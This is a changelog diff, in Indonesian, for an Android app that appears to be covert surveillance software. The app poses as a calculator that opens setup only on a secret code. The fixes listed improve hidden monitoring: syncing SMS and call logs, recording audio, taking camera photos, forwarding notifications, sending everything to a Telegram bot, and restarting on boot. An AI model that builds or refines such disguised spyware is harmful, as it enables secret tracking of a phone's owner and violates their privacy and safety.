@@ -1,5 +1,21 @@
 ## [Unreleased]
 
+## [1.6.60] - 2026-10-04
+
+### Fixed
+- `PreferencesManager` `saveCoreConfig`/`saveTestCredentials` reset `lastUpdateId`/`wakeUpdateId` dan bersihkan wake ping saat token/chat ganti agar perintah bot baru tak terlewat offset basi.
+- `handleCallbackQuery` samakan fallback tanggal sensitif ke `1L` agar tombol inline basi expired seperti perintah mutasi.
+- `BootReceiver` reset `photoPausedUntil` hanya saat boot nyata (`BOOT_COMPLETED`/`QUICKBOOT_POWERON`/`MY_PACKAGE_REPLACED`), tidak lagi saat `USER_UNLOCKED`/`USER_PRESENT` agar `/pause` tak gugur tiap buka kunci.
+- `MainActivity` hapus jalan pintas setup via tombol operator; kode rahasia hanya `1234` + `=` agar kalkulator berperilaku normal.
+- `TelegramClient` naikkan dispatcher ke `6`/`4` dan pool ke `6`, `TelegramMediaClient` ke `4`/`2` agar long-poll ganda tak memblokir `sendMessage`/`sendPhoto`.
+- `MessageScheduler` `scheduleMessageSendNext` pakai `APPEND` agar `retryAfter` rate-limit dihormati, tidak ter-coalesce oleh `KEEP`.
+- `MonitoringService` `stopMonitoring`/`handleFgsTimeout` reset `ringBusy`/`recordBusy`/`smsBusy`/`audioFlushBusy`/`photoFlushBusy` agar tak macet-busy.
+- `lastSyncTime` hanya untuk sync SMS/panggilan; hapus tulis saat kirim audio/foto sukses dan forward notif agar `/status` `Last sync` jujur.
+- `sendToTelegram` tampilkan notifikasi lokal `Chat not found (400)` via `postAuthFailureReminder` agar chat hilang terlihat tanpa buka Setup.
+- `checkAndSendNewData` kirim per chunk 10 dan majukan kursor progresif agar sukses parsial tak duplikat full 100.
+- `NotificationForwarderService` baca `BIG_TEXT`/`TEXT_LINES`/`SUB_TEXT` bila `TEXT` kosong; spam-filter tak lagi catat tiap drop ke `/lastnotif` agar history legit tak kegusur.
+- `CameraService` tulis foto via `.tmp` + rename atomik dan prune `.tmp` basi agar flush tak baca file setengah tulis.
+
 ## [1.6.59] - 2026-10-04
 
 ### Fixed
